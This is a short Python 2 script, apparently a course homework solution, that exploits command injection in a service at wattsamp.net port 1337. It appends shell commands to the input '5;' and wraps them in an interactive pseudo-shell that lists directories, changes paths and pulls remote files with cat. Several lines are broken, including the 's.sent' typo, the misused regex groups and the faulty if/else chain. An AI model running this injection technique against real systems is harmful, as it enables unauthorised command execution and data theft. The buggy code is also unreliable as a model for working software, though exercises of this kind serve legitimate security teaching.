"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""
#kali vm IP address is 192.168.1.13
import socket
import re
import string
import time
host = "wattsamp.net" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):
   
        # Sockets: https://docs.python.org/3/library/socket.html
        # How to use the socket s:
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	data = s.recv(1024)
	s.send("5; pwd\n")
	path = s.recv(1024)
	s.close()
	cmd = raw_input("Wattsamp Shell\n");
	while cmd != "quit":
		
        	# Establish socket connection
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))
		reg = re.search(r"(\w)( [\/\w]*)?",cmd)		
		if reg.group(0) == "help":
			print("Help:\n To quit: quit\n To download files: pull <remote path> <local path>\n To read this again: help")
		if reg.group(0) == "ls":
			s.send("5; ls " + path)
		if reg.group(0) == "pull":
			s.sent("5; cat " + path + "/" + reg.group(1) + "\n")	
		if reg.group(0) == "cd":
			s.send("5; " +path + "/" + cmd +"; pwd")
			data = s.recv(1024)
			path = data	
		else:
			s.send("5; "+cmd + " " + path +"\n")
			data=s.recv(1024)	
		print(data)
		s.close()
		cmd = raw_input("Wattsamp Shell\n")
	

if __name__ == '__main__':
    execute_cmd("shell")
